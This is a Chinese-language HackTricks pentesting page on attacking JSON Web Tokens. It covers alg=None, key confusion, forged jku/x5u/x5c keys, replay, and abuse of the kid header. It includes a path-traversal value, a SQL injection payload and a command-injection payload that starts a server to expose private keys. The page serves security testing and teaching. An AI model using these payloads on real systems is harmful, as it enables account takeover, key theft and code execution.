<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>JWT Vulnerabilities (Json Web Tokens)</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="jwt-vulnerabilities-json-web-tokens"><a class="header" href="#jwt-vulnerabilities-json-web-tokens">JWT Vulnerabilities (Json Web Tokens)</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>如果你对 <strong>黑客职业</strong> 感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>要求流利的波兰语书写和口语能力</em>).</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<p><strong>本帖部分内容基于精彩的文章：</strong> <a href="https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology"><strong>https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology</strong></a><br />
<strong>JWT 渗透测试的优秀工具作者</strong> <a href="https://github.com/ticarpi/jwt_tool"><strong>https://github.com/ticarpi/jwt_tool</strong></a></p>
<h3 id="快速胜利"><a class="header" href="#快速胜利"><strong>快速胜利</strong></a></h3>
<p>运行 <a href="https://github.com/ticarpi/jwt_tool"><strong>jwt_tool</strong></a> 并选择模式 <code>All Tests!</code>，然后等待绿色行输出。</p>
<pre><code class="language-bash">python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...&lt;JWT Token&gt;"
</code></pre>
<p>如果你运气好的话，工具会找到一些网络应用程序错误检查JWT的情况：</p>
<p><img src="../.gitbook/assets/image%20(935).png" alt="" /></p>
<p>然后，你可以在你的代理中搜索请求，或者使用jwt_工具转储该请求中使用的JWT：</p>
<pre><code class="language-bash">python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
</code></pre>
<p>您还可以使用 <a href="https://github.com/d0ge/sign-saboteur"><strong>Burp Extension SignSaboteur</strong></a> 从 Burp 发起 JWT 攻击。</p>
<h3 id="修改数据而不更改任何内容"><a class="header" href="#修改数据而不更改任何内容">修改数据而不更改任何内容</a></h3>
<p>您可以仅篡改数据，保持签名不变，并检查服务器是否在检查签名。例如，尝试将您的用户名更改为“admin”。</p>
<h4 id="令牌是否被检查"><a class="header" href="#令牌是否被检查"><strong>令牌是否被检查？</strong></a></h4>
<p>要检查 JWT 的签名是否被验证：</p>
<ul>
<li>错误消息表明正在进行验证；应检查详细错误中的敏感信息。</li>
<li>返回页面的变化也表明正在验证。</li>
<li>没有变化表明没有验证；这时可以尝试篡改有效负载声明。</li>
</ul>
<h3 id="来源"><a class="header" href="#来源">来源</a></h3>
<p>通过检查代理的请求历史，确定令牌是服务器端生成还是客户端生成非常重要。</p>
<ul>
<li>首次从客户端看到的令牌表明密钥可能暴露在客户端代码中，需要进一步调查。</li>
<li>来源于服务器端的令牌表明过程是安全的。</li>
</ul>
<h3 id="持续时间"><a class="header" href="#持续时间">持续时间</a></h3>
<p>检查令牌是否持续超过 24 小时……也许它永远不会过期。如果有“exp”字段，请检查服务器是否正确处理它。</p>
<h3 id="暴力破解-hmac-密钥"><a class="header" href="#暴力破解-hmac-密钥">暴力破解 HMAC 密钥</a></h3>
<p><a href="../generic-hacking/brute-force.html#jwt"><strong>查看此页面。</strong></a></p>
<h3 id="将算法修改为-none"><a class="header" href="#将算法修改为-none">将算法修改为 None</a></h3>
<p>将使用的算法设置为“None”，并移除签名部分。</p>
<p>使用名为“JSON Web Token”的 Burp 扩展尝试此漏洞，并更改 JWT 内部的不同值（将请求发送到 Repeater，在“JSON Web Token”选项卡中，您可以修改令牌的值。您还可以选择将“Alg”字段的值设置为“None”）。</p>
<h3 id="将算法-rs256非对称更改为-hs256对称cve-2016-5431cve-2016-10555"><a class="header" href="#将算法-rs256非对称更改为-hs256对称cve-2016-5431cve-2016-10555">将算法 RS256（非对称）更改为 HS256（对称）（CVE-2016-5431/CVE-2016-10555）</a></h3>
<p>算法 HS256 使用密钥对每个消息进行签名和验证。<br />
算法 RS256 使用私钥对消息进行签名，并使用公钥进行身份验证。</p>
<p>如果将算法从 RS256 更改为 HS256，后端代码将使用公钥作为密钥，然后使用 HS256 算法验证签名。</p>
<p>然后，使用公钥并将 RS256 更改为 HS256，我们可以创建一个有效的签名。您可以通过执行以下操作来检索 Web 服务器的证书：</p>
<pre><code class="language-bash">openssl s_client -connect example.com:443 2&gt;&amp;1 &lt; /dev/null | sed -n '/-----BEGIN/,/-----END/p' &gt; certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout &gt; pubkey.pem
</code></pre>
<h3 id="new-public-key-inside-the-header"><a class="header" href="#new-public-key-inside-the-header">New public key inside the header</a></h3>
<p>攻击者在令牌的头部嵌入一个新密钥，服务器使用这个新密钥来验证签名 (CVE-2018-0114)。</p>
<p>这可以通过 "JSON Web Tokens" Burp 扩展来完成。<br />
（将请求发送到 Repeater，在 JSON Web Token 标签中选择 "CVE-2018-0114" 并发送请求）。</p>
<h3 id="jwks-spoofing"><a class="header" href="#jwks-spoofing">JWKS Spoofing</a></h3>
<p>这些说明详细描述了一种评估 JWT 令牌安全性的方法，特别是那些使用 "jku" 头部声明的令牌。该声明应链接到一个包含令牌验证所需公钥的 JWKS (JSON Web Key Set) 文件。</p>
<ul>
<li><strong>评估带有 "jku" 头部的令牌</strong>：</li>
<li>验证 "jku" 声明的 URL，以确保它指向适当的 JWKS 文件。</li>
<li>修改令牌的 "jku" 值，以指向一个受控的网络服务，从而允许流量观察。</li>
<li><strong>监控 HTTP 交互</strong>：</li>
<li>观察对您指定 URL 的 HTTP 请求，表明服务器尝试从您提供的链接获取密钥。</li>
<li>在使用 <code>jwt_tool</code> 进行此过程时，务必更新 <code>jwtconf.ini</code> 文件，添加您的个人 JWKS 位置以便于测试。</li>
<li><strong><code>jwt_tool</code> 的命令</strong>：</li>
<li>执行以下命令以使用 <code>jwt_tool</code> 模拟场景：</li>
</ul>
<pre><code class="language-bash">python3 jwt_tool.py JWT_HERE -X s
</code></pre>
<h3 id="kid-issues-overview"><a class="header" href="#kid-issues-overview">Kid Issues Overview</a></h3>
<p>一个可选的头部声明 <code>kid</code> 用于识别特定密钥，这在存在多个密钥用于令牌签名验证的环境中尤为重要。该声明有助于选择适当的密钥来验证令牌的签名。</p>
<h4 id="revealing-key-through-kid"><a class="header" href="#revealing-key-through-kid">Revealing Key through "kid"</a></h4>
<p>当头部中存在 <code>kid</code> 声明时，建议在网络目录中搜索相应的文件或其变体。例如，如果指定了 <code>"kid":"key/12345"</code>，则应在网络根目录中搜索文件 <em>/key/12345</em> 和 <em>/key/12345.pem</em>。</p>
<h4 id="path-traversal-with-kid"><a class="header" href="#path-traversal-with-kid">Path Traversal with "kid"</a></h4>
<p><code>kid</code> 声明也可能被利用来遍历文件系统，可能允许选择任意文件。可以通过更改 <code>kid</code> 值以针对特定文件或服务来测试连接性或执行服务器端请求伪造 (SSRF) 攻击。通过使用 <code>-T</code> 标志在 jwt_tool 中篡改 JWT 以更改 <code>kid</code> 值，同时保留原始签名，可以实现如下所示：</p>
<pre><code class="language-bash">python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv "../../dev/null" -S hs256 -p ""
</code></pre>
<p>通过针对具有可预测内容的文件，可以伪造有效的JWT。例如，Linux系统中的<code>/proc/sys/kernel/randomize_va_space</code>文件，已知包含值<strong>2</strong>，可以在<code>kid</code>参数中使用<strong>2</strong>作为JWT生成的对称密码。</p>
<h4 id="通过kid的sql注入"><a class="header" href="#通过kid的sql注入">通过“kid”的SQL注入</a></h4>
<p>如果<code>kid</code>声明的内容用于从数据库中获取密码，则可以通过修改<code>kid</code>有效载荷来实现SQL注入。一个使用SQL注入来改变JWT签名过程的示例有效载荷包括：</p>
<p><code>non-existent-index' UNION SELECT 'ATTACKER';-- -</code></p>
<p>此更改强制使用已知的秘密密钥<code>ATTACKER</code>进行JWT签名。</p>
<h4 id="通过kid的os注入"><a class="header" href="#通过kid的os注入">通过“kid”的OS注入</a></h4>
<p><code>kid</code>参数指定在命令执行上下文中使用的文件路径的场景可能导致远程代码执行（RCE）漏洞。通过在<code>kid</code>参数中注入命令，可以暴露私钥。实现RCE和密钥暴露的示例有效载荷是：</p>
<p><code>/root/res/keys/secret7.key; cd /root/res/keys/ &amp;&amp; python -m SimpleHTTPServer 1337&amp;</code></p>
<h3 id="x5u和jku"><a class="header" href="#x5u和jku">x5u和jku</a></h3>
<h4 id="jku"><a class="header" href="#jku">jku</a></h4>
<p>jku代表<strong>JWK Set URL</strong>。<br />
如果令牌使用“<strong>jku</strong>”<strong>头部</strong>声明，则<strong>检查提供的URL</strong>。这应该指向一个包含JWKS文件的URL，该文件持有用于验证令牌的公钥。篡改令牌以将jku值指向您可以监控流量的Web服务。</p>
<p>首先，您需要创建一个新的证书，带有新的私钥和公钥。</p>
<pre><code class="language-bash">openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
</code></pre>
<p>然后您可以使用例如 <a href="https://jwt.io"><strong>jwt.io</strong></a> 来创建新的 JWT，使用 <strong>创建的公钥和私钥，并将参数 jku 指向创建的证书。</strong> 为了创建有效的 jku 证书，您可以下载原始证书并更改所需的参数。</p>
<p>您可以使用以下方法从公钥证书中获取参数 "e" 和 "n"：</p>
<pre><code class="language-bash">from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
</code></pre>
<h4 id="x5u"><a class="header" href="#x5u">x5u</a></h4>
<p>X.509 URL。指向一组以 PEM 格式编码的 X.509（证书格式标准）公共证书的 URI。该集合中的第一个证书必须是用于签署此 JWT 的证书。后续证书每个都签署前一个证书，从而完成证书链。X.509 在 RFC 52807 中定义。传输安全性是传输证书所必需的。</p>
<p>尝试<strong>将此头部更改为您控制下的 URL</strong>，并检查是否收到任何请求。在这种情况下，您<strong>可以篡改 JWT</strong>。</p>
<p>要使用您控制的证书伪造新令牌，您需要创建证书并提取公钥和私钥：</p>
<pre><code class="language-bash">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt &gt; publicKey.pem
</code></pre>
<p>然后你可以使用例如 <a href="https://jwt.io"><strong>jwt.io</strong></a> 来创建新的 JWT，使用 <strong>创建的公钥和私钥，并将参数 x5u 指向创建的 .crt 证书。</strong></p>
<p><img src="../.gitbook/assets/image%20(956).png" alt="" /></p>
<p>你也可以利用这两个漏洞 <strong>进行 SSRF</strong>。</p>
<h4 id="x5c"><a class="header" href="#x5c">x5c</a></h4>
<p>该参数可能包含 <strong>以 base64 编码的证书</strong>：</p>
<p><img src="../.gitbook/assets/image%20(1119).png" alt="" /></p>
<p>如果攻击者 <strong>生成自签名证书</strong> 并使用相应的私钥创建伪造的令牌，并将 "x5c" 参数的值替换为新生成的证书，并修改其他参数，即 n、e 和 x5t，那么伪造的令牌将被服务器接受。</p>
<pre><code class="language-bash">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
</code></pre>
<h3 id="嵌入式公钥-cve-2018-0114"><a class="header" href="#嵌入式公钥-cve-2018-0114">嵌入式公钥 (CVE-2018-0114)</a></h3>
<p>如果JWT嵌入了公钥，如下场景所示：</p>
<p><img src="../.gitbook/assets/image%20(624).png" alt="" /></p>
<p>使用以下nodejs脚本，可以从该数据生成公钥：</p>
<pre><code class="language-bash">const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
</code></pre>
<p>可以生成一个新的私钥/公钥，将新的公钥嵌入到令牌中，并用它生成新的签名：</p>
<pre><code class="language-bash">openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
</code></pre>
<p>您可以使用此 nodejs 脚本获取 "n" 和 "e"：</p>
<pre><code class="language-bash">const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
</code></pre>
<p>最终，使用公钥和私钥以及新的“n”和“e”值，您可以使用 <a href="https://jwt.io">jwt.io</a> 伪造一个包含任何信息的新有效 JWT。</p>
<h3 id="es256使用相同的随机数泄露私钥"><a class="header" href="#es256使用相同的随机数泄露私钥">ES256：使用相同的随机数泄露私钥</a></h3>
<p>如果某些应用程序使用 ES256 并使用相同的随机数生成两个 JWT，则可以恢复私钥。</p>
<p>这是一个示例：<a href="https://asecuritysite.com/encryption/ecd5">ECDSA：如果使用相同的随机数则泄露私钥（使用 SECP256k1）</a></p>
<h3 id="jti-jwt-id"><a class="header" href="#jti-jwt-id">JTI (JWT ID)</a></h3>
<p>JTI (JWT ID) 声明为 JWT 令牌提供了唯一标识符。它可以用于防止令牌被重放。<br />
然而，想象一下一个情况，其中 ID 的最大长度为 4（0001-9999）。请求 0001 和 10001 将使用相同的 ID。因此，如果后端在每个请求中递增 ID，您可以利用这一点来 <strong>重放请求</strong>（需要在每次成功重放之间发送 10000 个请求）。</p>
<h3 id="jwt-注册声明"><a class="header" href="#jwt-注册声明">JWT 注册声明</a></h3>
<p>{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}</p>
<h3 id="其他攻击"><a class="header" href="#其他攻击">其他攻击</a></h3>
<p><strong>跨服务中继攻击</strong></p>
<p>已经观察到一些 Web 应用程序依赖于受信任的 JWT 服务来生成和管理其令牌。记录到的实例表明，由 JWT 服务为一个客户端生成的令牌被同一 JWT 服务的另一个客户端接受。如果通过第三方服务观察到 JWT 的发行或续订，则应调查使用相同用户名/电子邮件在该服务的另一个客户端上注册帐户的可能性。然后应尝试在请求中重放获得的令牌，以查看是否被接受。</p>
<ul>
<li>您的令牌被接受可能表明存在一个关键问题，这可能允许伪造任何用户的帐户。然而，需要注意的是，如果在第三方应用程序上注册，可能需要更广泛测试的权限，因为这可能进入法律灰色地带。</li>
</ul>
<p><strong>令牌的过期检查</strong></p>
<p>令牌的过期是通过“exp”有效负载声明进行检查的。鉴于 JWT 通常在没有会话信息的情况下使用，因此需要谨慎处理。在许多情况下，捕获并重放另一个用户的 JWT 可能会使您能够冒充该用户。JWT RFC 建议通过利用“exp”声明为令牌设置过期时间来减轻 JWT 重放攻击。此外，应用程序实施相关检查以确保处理此值并拒绝过期令牌至关重要。如果令牌包含“exp”声明，并且测试时间限制允许，建议在过期时间过去后存储令牌并重放。令牌的内容，包括时间戳解析和过期检查（UTC 中的时间戳），可以使用 jwt_tool 的 -R 标志读取。</p>
<ul>
<li>如果应用程序仍然验证令牌，则可能存在安全风险，因为这可能意味着令牌永远不会过期。</li>
</ul>
<h3 id="工具"><a class="header" href="#工具">工具</a></h3>
<p>{% embed url="https://github.com/ticarpi/jwt_tool" %}</p>
<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>如果您对 <strong>黑客职业</strong> 感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>需要流利的波兰语书写和口语能力</em>)。</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/idor.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/ldap-injection.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/idor.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/ldap-injection.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
